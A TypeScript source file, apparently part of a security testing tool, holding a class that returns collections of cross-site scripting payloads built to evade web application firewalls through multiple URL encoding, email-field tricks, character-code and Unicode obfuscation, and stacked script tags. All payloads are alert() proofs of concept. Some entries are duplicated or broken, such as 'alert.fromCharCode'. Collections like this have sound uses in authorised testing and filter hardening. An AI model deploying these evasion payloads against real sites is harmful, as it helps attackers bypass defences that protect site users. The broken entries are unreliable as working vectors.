/**
 * XSS bypass vectors.
 * @description Web Application Firewall evasion.
 */
export class BypassVector {
  /**
   * Get double encoded vectors.
   * @description Multiple URL encoding bypass.
   * @returns Double-encoded XSS strings
   */
  static doubleEncoded(): string[] {
    return [
      encodeURIComponent(encodeURIComponent('<script>alert(1)</script>')),
      '%253Cscript%253Ealert(1)%253C/script%253E',
      encodeURI(encodeURI('<script>alert(1)</script>')),
      '%2525253Cscript%2525253Ealert(1)%2525253C/script%2525253E',
      encodeURIComponent(encodeURIComponent(encodeURIComponent('<script>alert(1)</script>'))),
      '%2525253C%2525253Cscript%2525253Ealert(1)%2525253C%2525253C/script%2525253E'
    ]
  }

  /**
   * Get PHP filter bypass vectors.
   * @description Email format bypasses.
   * @returns PHP filter bypass strings
   */
  static phpFilterBypass(): string[] {
    return [
      'any@domain.tld<script>alert(1)</script>',
      'test+@example.com<script>alert(1)</script>',
      '"test@example.com"<script>alert(1)</script>',
      '<script>alert(1)</script><script>alert(2)</script>',
      '<script>alert(1)</script><img src=x onerror=alert(2)>',
      '<script>alert(1)</script><svg onload=alert(2)>',
      'test<script>alert(1)</script>',
      'test<script>alert(1)</script>',
      'test<script>alert(1)</script>'
    ]
  }

  /**
   * Get strip-based bypass vectors.
   * @description Encoding bypasses.
   * @returns Strip-based bypass strings
   */
  static stripBasedBypass(): string[] {
    return [
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '%3Cimg%20src=x%20onerror=alert(1)%3E',
      '%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E',
      '%3CIMG%20SRC=X%20ONERROR=ALERT(1)%3E',
      '<script>alert(1)</script><!--test-->',
      '<img src=x onerror=alert(1)><!--test-->',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>alert(/XSS/.source)</script>',
      '<script>alert.fromCharCode(88,83,83)</script>',
      '<script>\u0061\u006c\u0065\u0072\u0074(1)</script>',
      '<script>\u0041\u004c\u0045\u0052\u0054(1)</script>',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
      '<script>setTimeout(alert,0)</script>',
      '<script>setInterval(alert,0)</script>',
      '<script>Function(alert)()</script>',
      '<script>(alert)()</script>',
      '<script>!alert()</script>',
      '<script>+alert()</script>',
      '<script>-alert()</script>',
      '<script>~alert()</script>',
      '<script>void alert()</script>'
    ]
  }

  /**
   * Get strict length bypass vectors.
   * @description Payload concatenation bypasses.
   * @returns Strict length bypass strings
   */
  static strictLengthBypass(): string[] {
    return [
      '<script>alert(1)</script><script>alert(2)</script>',
      '<script>alert(1)</script><img src=x onerror=alert(2)>',
      '<script>alert(1)</script><script>alert(2)</script><script>alert(3)</script>',
      '<script>alert(1)</script><script>alert(2)</script><script>alert(3)</script><script>alert(4)</script>',
      '<script>alert(1)</script><script>alert(2)</script><script>alert(3)</script><script>alert(4)</script><script>alert(5)</script><script>alert(6)</script><script>alert(7)</script><script>alert(8)</script>'
    ]
  }
}
